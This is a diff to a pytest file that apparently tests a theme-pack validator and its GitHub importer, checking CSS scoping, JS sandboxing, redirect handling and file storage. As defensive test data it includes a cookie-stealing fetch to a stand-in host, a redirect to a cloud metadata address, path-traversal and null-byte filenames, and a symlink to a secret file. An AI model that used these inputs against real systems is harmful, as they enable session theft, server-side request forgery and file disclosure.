@@ -17,11 +17,11 @@ from portalab.core.authz_port import Principal
 from portalab.core.errors import Conflict, NotFound
 from portalab.modules.ui.looks import NotificationLooks
 from portalab.modules.ui.themes.definition import validate_definition
-from portalab.modules.ui.visuals.analysis import analyse
-from portalab.modules.ui.visuals.github import GitHub, parse_address
+from portalab.modules.ui.visuals.analysis import VOCABULARY, analyse, interface_selector_ok, look_selector_ok
+from portalab.modules.ui.visuals.github import GitHub, GitHubError, parse_address
 from portalab.modules.ui.visuals.manifest import version_key
 from portalab.modules.ui.visuals.service import VisualPackError, VisualPacks
-from portalab.modules.ui.visuals.store import Files, PackageError, read_source, read_zip
+from portalab.modules.ui.visuals.store import Files, PackageError, Store, read_source, read_zip
 
 EXAMPLE = Path(__file__).resolve().parents[4] / "examples" / "visual-packs" / "nordlys"
 ADMIN = Principal(user_id=uuid4(), channel="user")
@@ -110,7 +110,9 @@ def test_the_example_pack_is_publishable_and_flags_its_script_and_its_hd_looks()
     kinds = {e["product"]: e["kind"] for e in report["elements"]}
     assert kinds["levelup_nordlys"] == "glsl" and kinds["effect_nordlysglow"] == "js"
     assert kinds["theme_nordlys"] == "theme" and kinds["frame_fjordring"] == "css"
-    assert [i["code"] for i in report["items"] if i["level"] != "info"] == ["js.script"]
+    # its script runs in the sandbox: noted, never a warning; nothing else to say
+    assert [i["code"] for i in report["items"] if i["level"] != "info"] == []
+    assert "js.sandboxed" in [i["code"] for i in report["items"]]
 
 
 @pytest.mark.parametrize(
@@ -129,13 +131,13 @@ def test_blocking_findings(change: dict[str, Any], code: str) -> None:
     assert not report["summary"]["publishable"]
 
 
-def test_a_look_that_replaces_a_builtin_one_is_a_warning_and_css_must_aim_at_its_look() -> None:
+def test_a_look_that_replaces_a_builtin_one_is_a_warning_and_its_css_must_aim_at_its_look_only() -> None:
     files = _pack(look="gold", replaces=True)
     files["elements/frame/f.css"] = 'body { color: red } .avatar-frame[data-frame="gold"] { color: red }'
     report = analyse(Files({k: v.encode() if isinstance(v, str) else v for k, v in files.items()}))
     codes = {i["code"]: i["level"] for i in report["items"]}
     assert codes["look.replaces_builtin"] == "warning"
-    assert codes["css.unscoped"] == "warning"
+    assert codes["css.unscoped"] == "blocking"  # a rule reaching outside its own element
 
 
 def test_js_and_glsl_contracts() -> None:
@@ -143,7 +145,7 @@ def test_js_and_glsl_contracts() -> None:
     files["elements/frame/z.js"] = "fetch('https://x.example/'+document.cookie)"
     report = analyse(Files({k: v.encode() if isinstance(v, str) else v for k, v in files.items()}))
     codes = {i["code"] for i in report["items"]}
-    assert {"js.no_export", "js.network", "js.storage"} <= codes
+    assert {"js.no_export", "js.network", "js.storage", "js.sandboxed"} <= codes
     files = _pack(type="level_up", look="zap", render={"kind": "glsl", "file": "z.glsl", "stage": True})
     files["elements/frame/z.glsl"] = "float out = 1.0;"
     report = analyse(Files({k: v.encode() if isinstance(v, str) else v for k, v in files.items()}))
@@ -255,3 +257,78 @@ async def test_a_published_version_is_never_changed_in_place_and_looks_are_not_s
     imported = await service.upload("other.zip", _zip(other))
     codes = {i["code"] for i in service.detail(imported.pack, imported.version)["report"]["items"]}
     assert {"look.taken", "product.taken"} <= codes
+
+
+@pytest.mark.parametrize(
+    ("selector", "ok"),
+    [
+        ('.avatar-frame[data-frame="x"]', True),
+        ('.avatar-frame[data-frame="x"]::before', True),
+        ('.avatar-frame[data-frame="x"] .inner > span', True),
+        ('.avatar-frame[data-frame="x"] ~ .price', False),  # its siblings: outside its element
+        ('.avatar-frame[data-frame="x"] + *', False),
+        ('body .avatar-frame[data-frame="x"]', False),
+        (':root .avatar-frame[data-frame="x"]', False),
+        ('.dialog:has([data-frame="x"])', False),
+        (".purchase .price", False),
+        ('[data-frame="other"]', False),
+    ],
+)
+def test_a_look_styles_its_own_element_only(selector: str, ok: bool) -> None:
+    assert look_selector_ok(selector, "x") is ok
+
+
+def test_an_interface_styles_under_its_own_key_and_renames_navigation_and_titles_only() -> None:
+    assert interface_selector_ok('[data-theme="n"] .shell-header', "n")
+    assert not interface_selector_ok(".shell-header", "n")
+    assert not interface_selector_ok('[data-theme="other"] .x', "n")
+    assert VOCABULARY.fullmatch("nav:nav.home") and VOCABULARY.fullmatch("news:title")
+    assert not VOCABULARY.fullmatch("marketplace:buy.confirm")  # what a member confirms stays Portalab's
+
+
+def test_github_stays_on_github() -> None:
+    with pytest.raises(GitHubError):
+        parse_address("https://github.com/acme/looks/tree/main/../../other")
+
+
+async def test_github_never_follows_a_redirect_elsewhere(tmp_path: Path) -> None:
+    def answer(request: httpx.Request) -> httpx.Response:
+        return httpx.Response(302, headers={"location": "http://169.254.169.254/latest/meta-data"})
+
+    service, _, _ = _service(tmp_path)
+    service.github = GitHub(httpx.AsyncClient(transport=httpx.MockTransport(answer)))
+    with pytest.raises(VisualPackError):
+        await service.from_github("https://github.com/acme/looks")
+
+
+async def test_an_answer_too_large_is_cut(tmp_path: Path) -> None:
+    def answer(request: httpx.Request) -> httpx.Response:
+        if "releases" in str(request.url):
+            return httpx.Response(200, json={"tag_name": "v1.0.0"})
+        if "raw.githubusercontent" in str(request.url):
+            return httpx.Response(200, content=_pack()["pack.json"])
+        return httpx.Response(200, content=b"0" * (51 * 1024 * 1024))
+
+    service, _, _ = _service(tmp_path)
+    service.github = GitHub(httpx.AsyncClient(transport=httpx.MockTransport(answer)))
+    with pytest.raises(VisualPackError):
+        await service.from_github("https://github.com/acme/looks")
+
+
+def test_stored_files_never_leave_their_folder(tmp_path: Path) -> None:
+    store = Store(tmp_path)
+    folder = store.keep("p", Files({"pack.json": b"{}", "a.css": b"x"}))
+    sha = folder.name
+    assert store.file("p", sha, "a.css") is not None
+    for name in ("../../state.json", "a.css\0.png", "/etc/passwd", "../" * 8 + "etc/passwd"):
+        assert store.file("p", sha, name) is None
+
+
+def test_a_link_in_a_dropped_folder_is_never_followed(tmp_path: Path) -> None:
+    secret = tmp_path / "secret.txt"
+    secret.write_text("server file")
+    pack = tmp_path / "pack"
+    pack.mkdir()
+    (pack / "pack.json").write_text("{}")
+    (pack / "stolen.txt").symlink_to(secret)
+    assert "stolen.txt" not in read_source(pack).entries
